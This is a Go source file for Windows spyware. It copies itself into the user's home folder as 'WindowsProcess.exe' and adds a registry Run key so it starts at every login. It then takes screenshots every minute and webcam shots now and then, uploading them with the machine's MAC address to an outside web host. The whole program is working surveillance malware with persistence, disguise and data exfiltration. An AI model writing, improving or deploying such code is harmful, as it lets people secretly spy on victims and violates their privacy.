package main

import (
	"bytes"
	"fmt"
	"image/jpeg"
	"io"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"

	"github.com/kbinani/screenshot"
	"golang.org/x/sys/windows/registry"
)

var (
	avicap32                    = syscall.NewLazyDLL("avicap32.dll")
	proccapCreateCaptureWindowA = avicap32.NewProc("capCreateCaptureWindowA")

	user32           = syscall.NewLazyDLL("user32.dll")
	procSendMessageA = user32.NewProc("SendMessageA")
)

func Slikanjeekrana() string {

	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)

	if err != nil {
		fmt.Println("Error")
		return "greska"
	}

	fileName := "Screenshot.jpg"
	file, err := os.Create(fileName)

	if err != nil {
		fmt.Println("Error za file", err)
		return "greska"
	}
	defer file.Close()

	jpegQuality := 60

	err = jpeg.Encode(file, img, &jpeg.Options{jpegQuality})
	if err != nil {
		fmt.Println("Error", err)
		return "greska"
	}

	fmt.Println("Uspjesno upisana slika ekrana")
	return fileName

}
func kopiranje(destination string) {

	destination = destination + "\\WindowsProcess.exe"
	ssss, err := os.Stat(destination)
	fmt.Println(ssss)

	if err == nil {
		fmt.Println("File already exists", err)
		return
	}
	if !os.IsNotExist(err) {
		fmt.Println("Error checking file", err)
		return
	}

	execPath, err := os.Executable()
	if err != nil {
		fmt.Println("Error", err)
		return
	}

	srcFile, err := os.Open(execPath)
	if err != nil {
		fmt.Println("Error", err)
		return
	}
	defer srcFile.Close()

	destDir := filepath.Dir(destination)
	err = os.MkdirAll(destDir, 0755)
	if err != nil {
		fmt.Println("error_dir", err)
	}

	destFile, err := os.Create(destination)
	if err != nil {
		fmt.Println("Error", err)
		return
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, srcFile)
	if err != nil {
		fmt.Println("Error", err)
		return
	}
	fmt.Println("File copied")
}
func addToStartup(destination string) {
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		fmt.Println("Error", err)
		return
	}
	defer key.Close()

	err = key.SetStringValue("WindowsProcess", destination+"\\WindowsProcess.exe")
	if err != nil {
		fmt.Println("Error", err)
		return

	}
	fmt.Println("added to startup")
}

func CaptureWebcam() {
	var name = "WebcamCapture"
	handle, _, _ := proccapCreateCaptureWindowA.Call(uintptr(unsafe.Pointer(&name)), 0, 0, 0, 320, 240, 0, 0)
	procSendMessageA.Call(handle, 0x40A, 0, 0)  // WM_CAP_DRIVER_CONNECT //najvjerovatnije problem ovde posto je napisamo za windows10 a ne 11
	procSendMessageA.Call(handle, 0x432, 30, 0) // WM_CAP_SET_PREVIEW
	procSendMessageA.Call(handle, 0x43C, 0, 0)  // WM_CAP_GRAB_FRAME
	procSendMessageA.Call(handle, 0x41E, 0, 0)  // WM_CAP_EDIT_COPY
	procSendMessageA.Call(handle, 0x40B, 0, 0)  // WM_CAP_DRIVER_DISCONNECT

	fileName2 := "Webcam.jpg"
	camera, err := os.Create(fileName2)

	if err != nil {
		fmt.Println(err)
		return
	}
	clip, err := readClipboard()
	if err != nil {
		fmt.Println(err)
		return
	}
	_, err = io.Copy(camera, clip)
	if err != nil {
		fmt.Println(err)
		return
	}
	camera.Close()

	fmt.Println("Uspjesno uslikana slika")
}

func readClipboard() (io.Reader, error) {
	f, err := os.CreateTemp("", "")
	if err != nil {
		fmt.Println(err)
		return nil, err
	}
	f.Close()
	_, err = exec.Command("PowerShell", "-Command", fmt.Sprintf("Add-Type -AssemblyName System.Windows.Forms;$clip=[Windows.Forms.Clipboard]::GetImage();if ($clip -ne $null) { $clip.Save('%s') };", f.Name())).CombinedOutput()
	if err != nil {
		fmt.Println(err)
		return nil, err
	}
	r := new(bytes.Buffer)
	file, err := os.Open(f.Name())
	if err != nil {
		fmt.Println(err)
		return nil, err
	}
	if _, err := io.Copy(r, file); err != nil {
		fmt.Println(err)
		return nil, err
	}
	file.Close()
	os.Remove(f.Name())
	return r, nil
}
func uploadData(screenshotFile string, mac string) {
	url := "https://screenshotkowe.000webhostapp.com/file.php"
	var requestBody bytes.Buffer
	write := multipart.NewWriter(&requestBody)

	file, err := os.Open(screenshotFile)

	if err != nil {
		fmt.Println("error", err)
		return
	}
	defer file.Close()

	part, err := write.CreateFormFile("screenshot", screenshotFile)
	if err != nil {
		fmt.Println("error", err)
		return
	}

	_, err = io.Copy(part, file)
	if err != nil {
		fmt.Println("error", err)
		return
	}
	_ = write.WriteField("mac_adrr", mac)
	write.Close()
	resp, err := http.Post(url, write.FormDataContentType(), &requestBody)
	if err != nil {
		fmt.Println("error", err)
		return
	}
	defer resp.Body.Close()

	resposneBody, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("error", err)
		return
	}
	fmt.Println("response", string(resposneBody))
}

func getMACAdress() (string, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "", err
	}
	for _, interf := range interfaces {
		if len(interf.HardwareAddr) > 0 {
			return interf.HardwareAddr.String(), nil
		}
	}
	return "", fmt.Errorf("No MAC adress find")

}
func checkInternetConn() bool {
	_, err := http.Get("https://google.com")
	return err == nil
}
func main() {

	homeDir, err := os.UserHomeDir()
	counter := 0
	if err != nil {
		fmt.Println("error", err)
		return
	}

	destination := filepath.Join(homeDir, ".windows_process")
	kopiranje(destination)
	addToStartup(destination)
	mac_addr, err := getMACAdress()
	if err != nil {
		fmt.Println("error", err)
	}
	fmt.Println(mac_addr)
	for {
		if !checkInternetConn() {
			fmt.Println("No internet conncection, waiting 3 minutes to again")
			time.Sleep(3 * time.Minute)
			continue
		}

		if counter%10 == 0 {
			CaptureWebcam()
		}
		counter++
		fileName := Slikanjeekrana()
		uploadData(fileName, mac_addr)

		time.Sleep(1 * time.Minute)
	}

}
